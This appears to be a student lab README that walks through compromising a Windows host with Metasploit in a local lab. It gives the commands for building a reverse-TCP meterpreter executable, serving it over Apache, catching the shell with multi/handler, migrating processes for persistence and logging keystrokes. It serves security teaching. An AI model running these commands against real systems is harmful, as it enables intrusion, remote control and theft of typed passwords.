# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
## OUTPUT:
![image](https://github.com/user-attachments/assets/2f69d906-0b7a-4878-8f96-272bacc10e00)

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![image](https://github.com/user-attachments/assets/88b39238-d2b6-447d-bc46-08dc30ccab8e)

copy the fun.exe into the apache /var/www/html folder
## OUTPUT
![image](https://github.com/user-attachments/assets/5034838b-e3d2-4f9f-b645-21b5c8ecdcba)

Start apache server
sudo systemctl apache2 start
## OUTPUT
![image](https://github.com/user-attachments/assets/7cb75fb5-6fa0-449a-8b21-e8f8b2fb6fcf)

Check the status of apache2
## OUTPUT
![image](https://github.com/user-attachments/assets/d8909df4-12f7-4a3a-888f-f8891c81c5e9)

Invoke msfconsole:
## OUTPUT:
![image](https://github.com/user-attachments/assets/9d3f4d70-6d31-454a-81e8-105eb0224090)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
![image](https://github.com/user-attachments/assets/ffd46926-d6b7-4ad2-8df4-26cd01a10af1)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
## OUTPUT:
![image](https://github.com/user-attachments/assets/e92d7605-0cdd-4a60-9fbc-f87490d37a9f)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
## OUTPUT:
![image](https://github.com/user-attachments/assets/2094ca08-d751-4add-af92-0ab1d0d1da53)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

## OUTPUT:
![image](https://github.com/user-attachments/assets/e61066d7-12fb-4942-9f01-3906941f7c47)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
![image](https://github.com/user-attachments/assets/fd50817c-df2b-40e2-bcb3-920d2baa5da0)

keyscan_dump Shows the keystrokes captured so far
## OUTPUT:
![image](https://github.com/user-attachments/assets/a5ce96df-cd40-4772-b531-90cf2462d6bf)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
